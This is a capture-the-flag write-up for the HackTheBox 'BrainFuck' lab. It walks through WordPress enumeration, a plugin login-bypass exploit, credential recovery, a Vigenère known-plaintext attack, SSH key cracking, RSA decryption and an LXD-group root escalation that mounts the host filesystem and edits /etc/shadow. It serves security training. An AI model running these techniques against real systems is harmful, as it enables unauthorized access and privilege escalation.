---
title: HackTheBox - BrainFuck
categories: [HackTheBox, HTB-Linux]
date: 2022-08-19
tags: [linux-priv-esc/lxd, cryptography]
img_path: /Writeups/HackTheBox/Linux/BrainFuck/images/
image:
  src: Pasted%20image%2020220819053202.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Overview 
This is the second machine from OSCP's TJNull's OSCP List for HackTheBox.

This machine begins w/ us enumerating several subdomains via NMAP's HTTPS script, followed by a wordpress plugin exploit that allowed us to login to an admin account w/o any credentials.
Next, we discovered another wordpress plugin, that stores SMTP credentials of user `orestis`, and via inspect element, we can unobscure the password.

With the SMTP credentials, we access the SMTP Server as `orestis` and found email that revealed credentials for the forum. 

On the forum (sup3rs3cr3t.brainfuck.htb - subdomains we enumerated earlier), there is a thread that is discussing about id_rsa but it is encrypted, however, due to a habit by orestis, adding `Orestis - Hacking for fun and profit` at the end of every post, we are able to do a known-plaintext attack and uncover the key, allowing us to download orestis's SSH private key, inturn allowing us to obtain orestis shell/user.

To root, there are 2 ways, on `orestis` home directory there is a RSA encryption python tool that encrypts `root.txt` and stores sensitive information (variables that creates the ciphertext) into `debug.txt`, allowing us to reverse engineer and obtain the plaintext of `root.txt`.

Another way (unintended way) is via LXD groups where `orestis` belongs to. It allows `orestis` to create a container that mounts the entire filesystem onto the container, allowing us root access to the system.


---

| Column       | Details     |
| ------------ | ----------- |
| Box Name     | BrainFuck   |
| IP           | 10.10.10.17 |
| Points       | -           |
| Difficulty   | Insane      |
| Creator      |       [ch4p](https://app.hackthebox.com/users/1)      |
| Release Date | 29-Apr-2017            |


# Recon

## TCP/443 (HTTPS)
### FFUF
```
┌──(root💀kali)-[~/htb/brainfuck]
└─# ffuf -u https://brainfuck.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://brainfuck.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
wp-admin                [Status: 301, Size: 194, Words: 7, Lines: 8]
wp-content              [Status: 301, Size: 194, Words: 7, Lines: 8]
wp-includes             [Status: 301, Size: 194, Words: 7, Lines: 8]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
:: Progress: [4615/4615] :: Job [1/1] :: 1106 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```
- `wordpress` CMS is running

### NMAP
```
Nmap 7.92 scan initiated Wed Aug 17 01:17:56 2022 as: nmap -vv --reason -Pn -T4 -sV -p 443 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN /root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_nmap.txt -oX /root/htb/brainfuck/10.10.10.17/scans/tcp443/xml/tcp_443_https_nmap.xml 10.10.10.17

...
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/organizationalUnitName=IT/localityName=Athens
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=orestis@brainfuck.htb/organizationalUnitName=IT/localityName=Athens
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-04-13T11:19:29
| Not valid after:  2027-04-11T11:19:29
| MD5:   cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20
| SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66
| -----BEGIN CERTIFICATE-----
| MIIFQzCCA6ugAwIBAgIJAI24F5h8eY+HMA0GCSqGSIb3DQEBCwUAMIGTMQswCQYD
| VQQGEwJHUjEPMA0GA1UECAwGQXR0aWNhMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV
| BAoMDkJyYWluZnVjayBMdGQuMQswCQYDVQQLDAJJVDEWMBQGA1UEAwwNYnJhaW5m
| dWNrLmh0YjEkMCIGCSqGSIb3DQEJARYVb3Jlc3Rpc0BicmFpbmZ1Y2suaHRiMB4X
| DTE3MDQxMzExMTkyOVoXDTI3MDQxMTExMTkyOVowgZMxCzAJBgNVBAYTAkdSMQ8w
| DQYDVQQIDAZBdHRpY2ExDzANBgNVBAcMBkF0aGVuczEXMBUGA1UECgwOQnJhaW5m
| dWNrIEx0ZC4xCzAJBgNVBAsMAklUMRYwFAYDVQQDDA1icmFpbmZ1Y2suaHRiMSQw
| IgYJKoZIhvcNAQkBFhVvcmVzdGlzQGJyYWluZnVjay5odGIwggGiMA0GCSqGSIb3
| DQEBAQUAA4IBjwAwggGKAoIBgQCjBI0m6FWgcLYONyxVeMgc+PuTFJMnMUjMb8BF
| t0PIDSCt10grCCfzBNDIqfU9byiokyYVvvD+sRoWJQfMjd3I3NXMxHwpcLM6X9oR
| Twt1iBBJRQkTnHOs1hyCmkiM+kn2W1xdL+mwBylAUlvUReLIDdS5anE7u95ApWsD
| TTUt/mMUl1DwnCqrNkt3czQzCNfCIwIhbaLjsoXsiVo1fFEr6UpsyiaXad9eTTsl
| EF9k3rByXrmP1WrkaFLqGhqS4v+rYtsyKGPngjAB664aAvB2sSI0/EuOTa7WOPcV
| NP3Tga+zx55qXPeo6nqCttOlAKKwiZqba5AgDAjSFdB6Q60dghWSuRYU999Ku6zA
| DdwP0BoT5+kcZJENY7wx1uzysSMrtCoi8E6bfx42UwNQe/UCDDXErXat90hTB+vV
| h2vaSdyR0tz3w1iIHBZH5/3rY3f+LyfE9fSg2TbGFgZNDq6O/iykVWb9SG+tl1fA
| RB208Y1/mOw0+84G9RIjLVMLb0kCAwEAAaOBlzCBlDAdBgNVHQ4EFgQUj12KscJg
| /6gSHzm+kzSN/psvik8wHwYDVR0jBBgwFoAUj12KscJg/6gSHzm+kzSN/psvik8w
| DAYDVR0TBAUwAwEB/zALBgNVHQ8EBAMCBeAwNwYDVR0RBDAwLoIRd3d3LmJyYWlu
| ZnVjay5odGKCGXN1cDNyczNjcjN0LmJyYWluZnVjay5odGIwDQYJKoZIhvcNAQEL
| BQADggGBAJ11TuRhhSQfq5NHXU5fV5VkCOPUx3yKsWjt93Qm8WDD2rJcZAq8jW59
| NHDWhzDlKZMyNYv8gKJ8k6HuG3f20yeifKZulGw/YsY6dDtTzO+tooBqzjWb9irh
| bpMIVXv1xBSuz+f5YGdzpvlMK/Ltt1nEQNjKXaTnjy7OGfp4isMZCzBZeKAKnjdn
| +s6TgFrFA94B56naXNaNLHvv9WcFKviwDTP2PtDz0fc9hbnZz8oxE5Q6/l50NGUK
| 6bGCVIjDJfM/SsWPLHb4J6chkJxlZZLmpid+s5PsKSdY0ZZ1Oxb20O2mla77hDSJ
| d43t/sZRBwWPEWxAHUR8Dj5pcrbCFyi57Qu4ENc5w7H0RhRyd0/OWs6ahn2ef4Qy
| DSWfdpd5CVBGdSLVlVSjzLcBDmWuyy8q5CTgJ3VzIzOreg93F2mVAF+tlNZRX9rc
| dFjsS0lwXWRZqd6642VuAtf4HoAFBh9PfBtUx+t1DxCXyY7OTwnvMsnNFg9fw11v
| krhc81zFeg==
|_-----END CERTIFICATE-----
```
- [Subdomains](https://blog.appsecco.com/a-penetration-testers-guide-to-sub-domain-enumeration-7d842d5570f6)
	- `sup3rs3cr3t.brainfuck.htb`
	- `brainfuck.htb`

# Initial Foothold

## TCP/443 (HTTPS) - Wordpress Responsive Ticket System Plugin Priv Esc Exploit
1. Add both subdomains to `/etc/hosts`
2. Proceed to `https://brainfuck.htb`, view post (`Dev Update`)
	![](Pasted%20image%2020220817022035.png)
	- `oretis`
	- `admin`
3. Enumerate wordpress
	1. Users
		```
		┌──(root💀kali)-[~/htb/brainfuck]
		└─# wpscan --no-update --disable-tls-checks --url https://brainfuck.htb -e u -f cli-no-color 2>&1 |tee "/root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_wpscan_user_enum.txt"
	
		...
		
		[i] User(s) Identified:
		
		[+] admin
		 | Found By: Author Posts - Display Name (Passive Detection)
		 | Confirmed By:
		 |  Rss Generator (Passive Detection)
		 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
		 |  Login Error Messages (Aggressive Detection)
		
		[+] administrator
		 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
		 | Confirmed By: Login Error Messages (Aggressive Detection)
		
		```
		- `admin`
		- `administrator`
	2. Plugins
		```
		┌──(root💀kali)-[~/htb/brainfuck]
		└─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url https://brainfuck.htb -e ap -f cli-no-color 2>&1 | tee "/root/htb/brainfuck/10.10.10.17/scans/tcp443/tcp_443_https_wpscan_plugins_enum.txt"
		
		[i] Plugin(s) Identified:
		
		[+] akismet
		 | Location: https://brainfuck.htb/wp-content/plugins/akismet/
		 | Last Updated: 2021-10-01T18:28:00.000Z
		 | Readme: https://brainfuck.htb/wp-content/plugins/akismet/readme.txt
		 | [!] The version is out of date, the latest version is 4.2.1
		 |
		 | Found By: Known Locations (Aggressive Detection)
		 |  - https://brainfuck.htb/wp-content/plugins/akismet/, status: 200
		 |
		 | Version: 3.3 (100% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - https://brainfuck.htb/wp-content/plugins/akismet/readme.txt
		 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
		 |  - https://brainfuck.htb/wp-content/plugins/akismet/readme.txt
		
		[+] easy-wp-smtp
		 | Location: https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/
		 | Last Updated: 2021-07-13T07:46:00.000Z
		 | Readme: https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt
		 | [!] The version is out of date, the latest version is 1.4.7
		 | [!] Directory listing is enabled
		 |
		 | Found By: Known Locations (Aggressive Detection)
		 |  - https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/, status: 200
		 |
		 | Version: 1.2.5 (100% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt
		 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
		 |  - https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt
		
		[+] wp-support-plus-responsive-ticket-system
		 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
		 | Last Updated: 2019-09-03T07:57:00.000Z
		 | Readme: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
		 | [!] The version is out of date, the latest version is 9.1.2
		 | [!] Directory listing is enabled
		 |
		 | Found By: Known Locations (Aggressive Detection)
		 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/, status: 200
		 |
		 | Version: 7.1.3 (100% confidence)
		 | Found By: Readme - Stable Tag (Aggressive Detection)
		 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
		 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
		 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
		```
		- `wp-support-plus-responsive-ticket-system 7.1.3`
		- `easy-wp-smtp`
1. Find exploits for `wp support plus responsive ticket system 7.1.3`
	
	| Exploit Title                                                                     | Path                  |
	| --------------------------------------------------------------------------------- | --------------------- |
	| WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3  Privilege Escala | php/webapps/41006.txt |
	| WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3  SQL Injection    | php/webapps/40939.txt |

6. Try `php/webapps/41006.txt - Privilege Escalation`
	1. This exploit allows you to login as any user due to of an incorrect usage of `wp_set_auth_cookie()`.
	2. Create form `exploit.html`
		![](Pasted%20image%2020220817033059.png)
	3. Host form w/ python webserver
		```
		┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/exploit]
		└─# python3 -m http.server 80
		Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...		
		```
	4. Proceed to `http://localhost/exploit.html` and click `Login`
		![](Pasted%20image%2020220817033222.png)
	5. Allow it to process for a moment, and you are Admin!
		![](Pasted%20image%2020220817033247.png)
6. `php/webapps/40939.txt - SQLi`, did not work for me
7. Proceed to `Settings` > `Easy WP SMTP`
8. Inspect element and change type from `password` to `text` to reveal password
	![](Pasted%20image%2020220817040252.png)
	- `kHGuERB29DNiNE`


## Accessing SMTP Server
1. Launch `Thunderbird` to view email
	![](Pasted%20image%2020220818022505.png)
2. View `Forum Access Details` email
	![](Pasted%20image%2020220817042321.png)
	- `orestis:kIEnnfEKJ#9UmdO`
	- This is likely used for `sup3rs3cr3t.brainfuck.htb` subdomain

## TCP/443 (HTTPS) - Found encrypted text
1. Proceed to `sup3rs3cr3t.brainfuck.htb` & login w/ `orestis:kIEnnfEKJ#9UmdO`
	![](Pasted%20image%2020220818020211.png)
2. View `SSH Access` post
	![](Pasted%20image%2020220818023306.png)
	- `Orestis - Hacking for fun and profit` is always written at the end of `orestis`'s post
	- Encrypted thread to converse about SSH key
3. View `Key` post
	![](Pasted%20image%2020220818023501.png)
	- The encrypted text at the end of all of `orestis`'s post looks like the text we saw from earlier
		- `Orestis - Hacking for fun and profit`
		- `Pieagnm - Jkoijeg nbw zwx mle grwsnn`
		- `Wejmvse - Fbtkqal zqb rso rnl cwihsf`
		- `Qbqquzs - Pnhekxs dpi fca fhf zdmgzt`
		- However, the ciphertext is different for every post
	- The encrypted text from `admin`, can be guessed
		- `mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr`
		- `mnvze` is likely `http`
		- `sp_ptr` is likely `id_rsa`
4. We can figure out the encryption key via [known-plaintext attack](https://en.wikipedia.org/wiki/Known-plaintext_attack)


## Derive encryption key w/ Vigenere Cipher (Subtraction)
1. **Example** of encrypting a `Plaintext` w/ a `Key`
	```
	Plaintext: THIS IS SECRET
	Key: 	   XVHE UW NOPGDZ
	Ciphertext: QCPW CO FSRXHS
	
	
	Plaintext + Key = Ciphertext
	T(19) + X(23) = Q(16)
	```
	![](Pasted%20image%2020220818034735.png)
2. **Example** of deriving the `Key` from `Plaintext` & `Ciphertext`
	```
	Plaintext: THIS IS SECRET
	Key: 	   XVHE UW NOPGDZ
	Ciphertext: QCPW CO FSRXHS

	Key = Ciphertext - Plaintext
	Key = Q(16) - T(19)
	```
	![](Pasted%20image%2020220818035327.png)
4. Derive key 
	```
	Ciphertext: Pieagnm - Jkoijeg nbw zwx mle grwsn
	Plaintext:  Orestis - Hacking for fun and profit
	
	
	Key = P - O(14)  #B
	Key = i - r(17)  #R
	Key = e - e(4)   #A
	Key = a - s(18)  #I
	Key = g - t(19)  #N
	Key = n - i(8)   #F
	Key = m - s(18)  #U 
	Key = J - H(7)   #C
	Key = k - a(0)   #K
	Key = o - c(2)   #M
	Key = i - k(10)  #Y
	Key = j - i(8)   #B
	
	Key = FUCKMYBRAIN
	```
	![](Pasted%20image%2020220818060216.png)
5. Decrypt URL
	```
	https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
	```
![](Pasted%20image%2020220818060905.png)

## Derive encryption key w/ Vigenere Cipher (Vigenere Table)
- Vigenere Table
	```
	Plaintext:  Orestis - Hacking for fun and profit
	Ciphertext: Wejmvse - Fbtkqal zqb rso rnl cwihsf
	
	O Mapped to W = I
	r Mapped to e = N
	e mapped to j = F
	s mapped to m = U
	t mapped to v = C
	i mapped to s = K
	s mapped to e = M
	H mapped to F = Y
	a mapped to b = B
	c mapped to t = R
	k mapped to k = A
	i mapped to q = I
	n mapped to a = N

	Key = FUCKMYBRAIN

	```
	![](Pasted%20image%2020220818052843.png)
	![](Pasted%20image%2020220818052923.png)
	![](Pasted%20image%2020220818053003.png)
	![](Pasted%20image%2020220818053118.png)
	![](Pasted%20image%2020220818053208.png)
	![](Pasted%20image%2020220818053329.png)
	![](Pasted%20image%2020220818053409.png)
	![](Pasted%20image%2020220818053540.png)
	![](Pasted%20image%2020220818053645.png)
	![](Pasted%20image%2020220818053722.png)


## TCP/22 (SSH)
1. Download the key
	```
	┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
	└─# curl https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --insecure > id_rsa; chmod 600 id_rsa
	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
	                                 Dload  Upload   Total   Spent    Left  Speed
	100  1766  100  1766    0     0  11118      0 --:--:-- --:--:-- --:--:-- 11106
	```
2. SSH w/ downloaded key
	```
	┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
	└─# ssh orestis@$ip -i id_rsa 
	Enter passphrase for key 'id_rsa': 
	```
3. Crack SSH pass
	```
	┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
	└─# /root/tools/john/run/ssh2john.py id_rsa > id_rsa_john
	┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
	└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_john
	Using default input encoding: UTF-8
	Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
	Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
	Cost 2 (iteration count) is 1 for all loaded hashes
	Will run 2 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	3poulakia!       (id_rsa)     
	1g 0:00:00:04 DONE (2022-08-19 02:53) 0.2347g/s 2924Kp/s 2924Kc/s 2924KC/s 3poulakia!..3pornuthin
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed. 
	```
	- `3poulakia!`
4. SSH & Obtain User Flag
![](Pasted%20image%2020220819025428.png)


# Privilege Escalation

## Root - Via Cracking/Reverse Engineering RSA
1. View files in `orestis` home directory
	```
	orestis@brainfuck:~$ ls -l
	total 28
	-rw-rw-r-- 1 orestis orestis  619 Aug 18 22:48 debug.txt
	-rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
	-rw-rw-r-- 1 orestis orestis 1041 Aug 18 22:32 encrypt.sage.py
	drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
	-rw-rw-r-- 1 orestis orestis  329 Aug 18 22:48 output.txt
	-rw-rw-r-- 1 orestis orestis    5 Aug 18 22:27 password
	-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt
	
	```
2. View `encrypt.sage`
	```
	nbits = 1024
	
	password = open("/root/root.txt").read().strip()
	enc_pass = open("output.txt","w")
	debug = open("debug.txt","w")
	m = Integer(int(password.encode('hex'),16))
	
	p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
	q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
	n = p*q
	phi = (p-1)*(q-1)
	e = ZZ.random_element(phi)
	while gcd(e, phi) != 1:
	    e = ZZ.random_element(phi)
	
	
	
	c = pow(m, e, n)
	enc_pass.write('Encrypted Password: '+str(c)+'\n')
	debug.write(str(p)+'\n')
	debug.write(str(q)+'\n')
	debug.write(str(e)+'\n')
	
	```
	![](Pasted%20image%2020220819041906.png)
	- `p, q, e` - suggests that it is RSA
		- We have the values of `p, q, e` in `debug.txt`
	- `ct/ciphertext/enc_pass` - ciphertext/output of encoding root.txt`
		- We have the values of it in `output.txt`
3. RSA key generation works by computing:
	-   n = pq
	-   φ = (p-1)(q-1)
	-   d = (1/e) mod φ
	- So given p, q, you can compute n and φ trivially via multiplication. From e and φ you can compute d, which is the secret key exponent. From there, your public key is [n, e] and your private key is [d, p, q]. Once you know those, you have the keys and can decrypt any messages.
	- For RSA to be secure, `p` and `q` must be kept secret. With access to `p`, `q`, and `e`, calculating `d` (the decryption key) is trivial. 
	- [Source](https://security.stackexchange.com/a/25632)
4. Google for a script that will do the above for us
	```
	def egcd(a, b):
	    x,y, u,v = 0,1, 1,0
	    while a != 0:
	        q, r = b//a, b%a
	        m, n = x-u*q, y-v*q
	        b,a, x,y, u,v = a,r, u,v, m,n
	        gcd = b
	    return gcd, x, y
	
	def main():
	
	    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
	    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
	    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
	    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
	
	    # compute n
	    n = p * q
	
	    # Compute phi(n)
	    phi = (p - 1) * (q - 1)
	
	    # Compute modular inverse of e
	    gcd, a, b = egcd(e, phi)
	    d = a
	
	    print( "n:  " + str(d) );
	
	    # Decrypt ciphertext
	    pt = pow(ct, d, n)
	    print( "pt: " + str(pt) )
	
	if __name__ == "__main__":
	    main()
	```
	- [Source](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)
	- Obtain values of `p, q, e` from `debug.txt`
	- Obtain values of `ct - ciphertext` from `output.txt`
5. Run decrypt script
	```
	┌──(root💀kali)-[~/htb/brainfuck/10.10.10.17/loot]
	└─# python decrypt.py 
	n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
	pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
	
	```
	- Then convert `pt - plaintxt` to `Hex` and then to `ASCII`
		- `m = Integer(int(password.encode('hex'),16))` - due to this line of code (Line 6)
6. Convert
![](Pasted%20image%2020220819051338.png)
![](Pasted%20image%2020220819051359.png)
7. Root Flag
	```
	6efc1a5dbb8904751ce6566a305bb8ef
	```


## Root - Via LXD
1. View groups that `orestis` belongs to
	```
	orestis@brainfuck:~$ groups
	orestis adm cdrom dip plugdev lxd lpadmin sambashare
	```
	- `lxd`
2. [LXD Group Exploit](https://yufongg.github.io/posts/LXD-Group/)
	- A member of the `lxd` group can easily privilege escalate to root because LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket.
	- We are able to use `lxd` to mount the entire victim's filesystem into a container, allowing us to have root access to the entire system.
3. [Download](https://github.com/saghul/lxd-alpine-builder) and transfer image onto `brainfuck.htb`
4. Exploit
	```
	# import image(.tar file) into lxc
	lxc image import ./alpine.tar.gz --alias privesc

	# Initialize/start a container from that image
	lxc init privesc privesc-container -c security.privileged=true

	# Mount entire file system to the mnt of the container
	lxc config device add privesc-container mydevice disk source=/ path=/mnt/root recursive=true

	# Start the container
	lxc start privesc-container

	# Execute the container and get an interactive shell
	lxc exec privesc-container /bin/sh
	```
	![](Pasted%20image%2020220819052441.png)
4. To obtain root, replace root hash w/ `orestis`'s 
	```
	vi /mnt/root/etc/shadow
	```
	![](Pasted%20image%2020220819060640.png)
5. Switch to root w/ `orestis`'s password `kHGuERB29DNiNE`
	![](Pasted%20image%2020220819060751.png)